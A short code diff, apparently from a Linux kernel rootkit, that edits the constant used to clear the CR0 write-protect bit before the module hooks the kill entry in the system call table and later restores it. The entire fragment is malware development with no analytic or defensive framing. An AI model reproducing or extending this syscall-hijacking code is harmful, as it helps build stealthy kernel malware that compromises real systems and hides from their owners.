@@ -59,7 +59,7 @@ static int __init rk_init(void)
 {
   unsigned long *__sysc = ret_sysc_table();
 
-  def_cr0(cr0 & ~0x0010000);
+  def_cr0(cr0 & ~0x00010000);
 
   orig_kill = (t_syscall)__sysc[__NR_kill];
 
@@ -72,7 +72,7 @@ static int __init rk_init(void)
 
 static void __exit rk_destroy(void)
 {
-  def_cr0(cr0 & ~0x0010000);
+  def_cr0(cr0 & ~0x00010000);
 
   __sysc[__NR_kill] = (unsigned long)orig_kill;
 
